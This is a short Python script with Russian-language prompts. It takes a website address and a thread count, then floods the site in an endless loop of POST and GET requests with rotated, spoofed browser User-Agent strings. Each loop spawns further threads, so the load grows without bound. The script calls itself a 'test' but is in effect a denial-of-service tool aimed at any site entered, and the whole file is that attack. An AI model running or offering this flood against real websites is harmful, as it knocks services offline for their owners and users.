import requests
import random
from threading import Thread

url = input('Сайт: ')
threads_numbers = input('Использовать потоков:')

USER_AGENT = [
    "uagent Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "uagent=[]Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 "
    "Chrome/16.0.912.63 Safari/535.7",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
]


def test():
    while True:
        headers = {
            'User-Agent': random.choice(USER_AGENT)
        }
        post_cannon = requests.post(url, headers=headers)
        get_cannon = requests.get(url, headers=headers)
        for i in range(int(threads_numbers)):
            thread = Thread(target=test)
        thread.start()
        print('Тест ОК...')


test()
